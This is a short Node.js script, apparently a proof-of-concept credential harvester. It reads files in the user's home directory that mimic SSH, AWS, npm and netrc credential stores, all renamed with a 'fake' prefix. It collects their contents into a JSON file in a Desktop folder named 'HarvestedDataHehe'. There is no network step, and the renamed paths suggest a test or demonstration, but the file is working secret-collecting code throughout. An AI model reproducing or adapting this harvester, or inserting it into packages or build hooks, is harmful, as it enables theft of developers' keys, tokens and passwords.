const fs = require("fs");
const os = require("os");
const path = require("path");

const home = os.homedir();

const targets = [
  ".test",
  ".fakesshcred",
  ".fakeaws/credentials",
  ".fakenpmrc",
  ".fakenetrc",
];

let collectedData = [];

for (const rel of targets) {
  const filePath = path.join(home, rel);

  try {
    const stat = fs.statSync(filePath);

    const content = fs.readFileSync(filePath, "utf8").slice(0, 4096);

    collectedData.push({
      path: filePath,
      content: content
    });
  } catch (err) {
    console.log("Failed:", filePath, err.code);
  }
}

const outDir = path.join(home, "Desktop", "HarvestedDataHehe");
fs.mkdirSync(outDir, { recursive: true });

const outFile = path.join(outDir, "collected_data.json");
fs.writeFileSync(outFile, JSON.stringify(collectedData, null, 2));

console.log("[DEBUG] Output:", outFile);
